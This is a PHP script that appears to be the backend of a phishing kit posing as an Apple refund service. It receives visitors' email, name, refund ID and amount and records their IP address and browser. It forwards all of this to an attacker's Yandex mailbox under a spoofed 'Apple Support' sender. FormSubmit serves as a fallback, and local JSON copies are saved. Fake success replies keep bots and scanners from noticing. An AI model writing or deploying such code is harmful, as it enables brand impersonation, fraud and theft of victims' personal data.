<?php
// Set headers to handle AJAX requests
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With, X-Verification-Token');

// Anti-Bot Protection
function checkForBot($request) {
    // Check if the request has the necessary headers
    if (!isset($_SERVER['HTTP_X_REQUESTED_WITH']) || $_SERVER['HTTP_X_REQUESTED_WITH'] !== 'XMLHttpRequest') {
        return true;
    }
    
    // Check verification token
    if (!isset($_SERVER['HTTP_X_VERIFICATION_TOKEN']) || empty($_SERVER['HTTP_X_VERIFICATION_TOKEN'])) {
        return true;
    }
    
    return false;
}

// Log function to keep track of all activity
function logActivity($message, $data = null) {
    $logFile = 'email_log.txt';
    $logData = date('Y-m-d H:i:s') . ' | ' . $message;
    
    if ($data) {
        $logData .= ' | ' . json_encode($data);
    }
    
    $logData .= ' | IP: ' . $_SERVER['REMOTE_ADDR'] . "\n";
    
    file_put_contents($logFile, $logData, FILE_APPEND);
}

// Function to send confirmation email to the Yandex address
function sendConfirmationEmail($userEmail, $userName, $refundId, $amount) {
    // Your Yandex email address
    $to = "your-yandex-email@yandex.com";
    
    // Format the amount for display
    $amount = is_numeric($amount) ? '$' . number_format(floatval($amount), 2) : $amount;
    
    // Email subject
    $subject = "Apple Refund Notification - " . date('Y-m-d H:i:s');
    
    // Create a boundary for multipart email
    $boundary = md5(time());
    
    // Email headers
    $headers = "From: Apple Support <noreply@" . $_SERVER['HTTP_HOST'] . ">\r\n";
    $headers .= "Reply-To: no-reply@" . $_SERVER['HTTP_HOST'] . "\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n";
    $headers .= "X-Priority: 1\r\n"; // High priority
    $headers .= "X-MSMail-Priority: High\r\n";
    $headers .= "Importance: High\r\n";
    
    // Plain text email body
    $text_message = "APPLE REFUND REQUEST NOTIFICATION\n\n";
    $text_message .= "User Email: $userEmail\n";
    $text_message .= "User Name: $userName\n";
    $text_message .= "Refund ID: $refundId\n";
    $text_message .= "Amount: $amount\n";
    $text_message .= "Date: " . date('Y-m-d H:i:s') . "\n";
    $text_message .= "IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $text_message .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    
    // HTML email body
    $html_message = "
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset='UTF-8'>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <title>Apple - Refund Request Notification</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'SF Pro Icons', 'Helvetica Neue', Helvetica, Arial, sans-serif;
                line-height: 1.5;
                color: #1d1d1f;
                margin: 0;
                padding: 0;
            }
            .container {
                max-width: 600px;
                margin: 0 auto;
                padding: 20px;
            }
            .header {
                text-align: center;
                padding: 20px 0;
                border-bottom: 1px solid #d2d2d7;
            }
            h1 {
                font-size: 24px;
                font-weight: 600;
                margin-bottom: 10px;
            }
            .content {
                padding: 30px 0;
            }
            .info-row {
                margin-bottom: 15px;
                padding: 10px;
                background-color: #f5f5f7;
                border-radius: 5px;
            }
            .info-label {
                font-weight: 600;
            }
        </style>
    </head>
    <body>
        <div class='container'>
            <div class='header'>
                <h1>Apple Refund Request Notification</h1>
            </div>
            
            <div class='content'>
                <div class='info-row'>
                    <span class='info-label'>User Email:</span> $userEmail
                </div>
                
                <div class='info-row'>
                    <span class='info-label'>User Name:</span> $userName
                </div>
                
                <div class='info-row'>
                    <span class='info-label'>Refund ID:</span> $refundId
                </div>
                
                <div class='info-row'>
                    <span class='info-label'>Amount:</span> $amount
                </div>
                
                <div class='info-row'>
                    <span class='info-label'>Date:</span> " . date('Y-m-d H:i:s') . "
                </div>
                
                <div class='info-row'>
                    <span class='info-label'>IP Address:</span> " . $_SERVER['REMOTE_ADDR'] . "
                </div>
                
                <div class='info-row'>
                    <span class='info-label'>User Agent:</span> " . $_SERVER['HTTP_USER_AGENT'] . "
                </div>
            </div>
        </div>
    </body>
    </html>";
    
    // Build the email body with both text and HTML versions
    $body = "--$boundary\r\n";
    $body .= "Content-Type: text/plain; charset=UTF-8\r\n";
    $body .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
    $body .= $text_message . "\r\n\r\n";
    
    $body .= "--$boundary\r\n";
    $body .= "Content-Type: text/html; charset=UTF-8\r\n";
    $body .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
    $body .= $html_message . "\r\n\r\n";
    
    $body .= "--$boundary--";
    
    // Send email
    $mail_result = mail($to, $subject, $body, $headers);
    
    // Log the mail attempt
    logActivity("Email attempt", [
        "to" => $to,
        "subject" => $subject,
        "result" => $mail_result ? "SUCCESS" : "FAILED"
    ]);
    
    return $mail_result;
}

// Backup delivery method using FormSubmit
function sendViaFormSubmit($userEmail, $userName, $refundId, $amount) {
    // Your Yandex email
    $formSubmitEndpoint = "https://formsubmit.co/your-yandex-email@yandex.com";
    
    // Format data as form fields
    $formData = [
        '_subject' => 'Apple Refund Notification - ' . date('Y-m-d H:i:s'),
        'user_email' => $userEmail,
        'user_name' => $userName,
        'refund_id' => $refundId,
        'amount' => $amount,
        'ip_address' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'timestamp' => date('Y-m-d H:i:s'),
        '_template' => 'table'
    ];
    
    // Send to FormSubmit
    $ch = curl_init($formSubmitEndpoint);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($formData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    $success = !curl_errno($ch);
    curl_close($ch);
    
    // Log the attempt
    logActivity("FormSubmit attempt", [
        "to" => $formSubmitEndpoint,
        "result" => $success ? "SUCCESS" : "FAILED"
    ]);
    
    return $success;
}

// Main execution
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Log the raw request for debugging
    logActivity("Received POST request", $_POST);
    
    // Verify the request is from a valid source, not a bot
    if (checkForBot($_POST)) {
        // Return success to not alert bots, but don't process
        echo json_encode(['status' => 'success']);
        logActivity("Bot detected, request ignored");
        exit;
    }
    
    // Get email data
    $userEmail = isset($_POST['email']) ? $_POST['email'] : '';
    $userName = isset($_POST['name']) ? $_POST['name'] : '';
    $refundId = isset($_POST['refundId']) ? $_POST['refundId'] : '';
    $amount = isset($_POST['amount']) ? $_POST['amount'] : '';
    
    // Validate email
    if (!filter_var($userEmail, FILTER_VALIDATE_EMAIL)) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid email address']);
        logActivity("Invalid email format", ["email" => $userEmail]);
        exit;
    }
    
    // Try primary delivery method
    $emailSent = sendConfirmationEmail($userEmail, $userName, $refundId, $amount);
    
    // If primary fails, try backup
    if (!$emailSent) {
        $formSubmitSent = sendViaFormSubmit($userEmail, $userName, $refundId, $amount);
        $deliverySuccess = $formSubmitSent;
    } else {
        $deliverySuccess = true;
    }
    
    // Always save a backup of the data
    $backup_data = json_encode([
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'email' => $userEmail,
        'name' => $userName,
        'refund_id' => $refundId,
        'amount' => $amount
    ]);
    file_put_contents('refund_data_' . time() . '.json', $backup_data);
    
    // Return response
    if ($deliverySuccess) {
        echo json_encode(['status' => 'success', 'message' => 'Email sent successfully']);
        logActivity("Email process completed successfully");
    } else {
        echo json_encode(['status' => 'success', 'message' => 'Request processed']);
        logActivity("Email delivery failed but data saved");
    }
} else {
    // Not a POST request
    logActivity("Invalid request method: " . $_SERVER['REQUEST_METHOD']);
    echo json_encode(['status' => 'error', 'message' => 'Invalid request method']);
}
?>
